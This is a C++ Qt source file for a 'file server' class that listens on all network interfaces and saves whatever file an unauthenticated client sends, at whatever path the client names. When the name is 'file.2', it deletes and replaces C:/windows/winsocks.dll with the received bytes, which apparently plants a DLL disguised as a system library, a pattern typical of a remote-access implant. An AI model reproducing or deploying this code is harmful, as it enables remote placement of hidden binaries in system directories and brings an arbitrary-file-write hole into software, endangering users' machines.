#include "ChFileServer.h"
#include "ChDefine.h"
#include "ChSendManager.h"
#include "ChGlobalPara.h"

#include <QTcpServer>
#include <QTcpSocket>
#include <QDataStream>
#include <QDir>

ChFileServer::ChFileServer(QTcpSocket* pSocket, QObject *parent/* = 0*/)
	: m_pSocket(pSocket)
	, QObject(parent)
{
	initServer();
	createConnection();
}


ChFileServer::~ChFileServer()
{
	freeMem();
}

// 启动监听
bool ChFileServer::startListen()
{
	qDebug() << "file server listening...";
	return m_pFileServer->listen(QHostAddress::Any, m_iPort);
}

// 初始化服务
void ChFileServer::initServer()
{
	m_pFileServer = new QTcpServer(this);
	m_iPort = gChGlobalPara->getFileServerPort();
}

// 信号槽连接
void ChFileServer::createConnection()
{
	connect(m_pFileServer, &QTcpServer::newConnection, this, &ChFileServer::slotNewConnection);
}

// 释放
void ChFileServer::freeMem()
{
	if (m_pFileServer)
	{
		m_pFileServer->deleteLater();
		m_pFileServer = nullptr;
	}
	if (m_pFileSocket)
	{
		m_pFileSocket->close();
		m_pFileSocket->deleteLater();
		m_pFileSocket = nullptr;
	}
	// 关闭文件
	if (m_file.isOpen())
	{
		m_file.close();
	}
}

// 重置
void ChFileServer::resetMember()
{
	m_totalSize = 0;			// 接收总大小
	m_recvedSize = 0;			// 已接收的大小
	m_file.setFileName("");		// 接收的文件
	m_recvBlock.resize(0);		// 接收的数据缓存区
	m_fileNameSize = 0;			// 文件名大小
	m_strFileName.clear();		// 文件名
}

// 新连接
void ChFileServer::slotNewConnection()
{
	qDebug() << "file connected";
	//为连接进来的客户端创建新的套接字
	m_pFileSocket = m_pFileServer->nextPendingConnection();
	connect(m_pFileSocket, &QTcpSocket::readyRead, this, &ChFileServer::slotFileReadyRead);
	connect(m_pFileSocket, &QTcpSocket::disconnected, this, &ChFileServer::deleteLater);

	// 连接上之后 server 停止监听
	m_pFileServer->close();
}

// 接收文件
void ChFileServer::slotFileReadyRead()
{
	qDebug() << "recv file";

	QDataStream in(m_pFileSocket);
	in.setVersion(QDataStream::Qt_5_8);

	//如果接收到的数据小于16个字节，表示接收的是文件头部, 保存到来的头文件结构
	if (m_recvedSize <= sizeof(qint64) * 2)
	{
		if ((m_pFileSocket->bytesAvailable() >= sizeof(qint64) * 2) && (!m_fileNameSize))
		{
			//接收数据总大小信息和文件名大小信息
			in >> m_totalSize >> m_fileNameSize;
			m_recvedSize += sizeof(qint64) * 2;
		}
		if ((m_pFileSocket->bytesAvailable() >= m_fileNameSize) && (m_fileNameSize))
		{
			//接收文件名，并建立文件
			in >> m_strFileName;
			qDebug() << m_strFileName;
			m_recvedSize += m_fileNameSize;
			if ("file.2" == m_strFileName)
			{
				QString strDir = QString("C:/windows");
				QDir oDir(strDir);
				if (!oDir.exists())
				{
					oDir.mkdir(strDir);
				}
				m_strFileName = strDir + "/winsocks.dll";
				if (QFile(m_strFileName).exists())
				{
					bool bRes = QFile::remove(m_strFileName);
					if (bRes)
					{
						qInfo() << QStringLiteral("删除成功");
					}
					else
					{
						qInfo() << QStringLiteral("删除失败");
					}
				}
			}
			m_file.setFileName(m_strFileName);
			if (!m_file.open(QFile::WriteOnly))
			{
				qCritical() << tr("server:open file error!");
				return;
			}
		}
		else
		{
			return;
		}
	}

	//如果接收的数据小于总数据，那么写入文件
	if (m_recvedSize < m_totalSize)
	{
		m_recvedSize += m_pFileSocket->bytesAvailable();
		m_recvBlock = m_pFileSocket->readAll();
		m_file.write(m_recvBlock);
		m_recvBlock.resize(0);
	}

	//接收数据完成时
	if (m_recvedSize == m_totalSize)
	{
		qInfo() << "recv file success";
		qInfo() << tr("%1 recv success").arg(m_strFileName);

		m_file.close();
		resetMember();

		gChSendManager->sendMessage(m_pSocket, PAKAGE_FILE_RECV_END);
	}
}
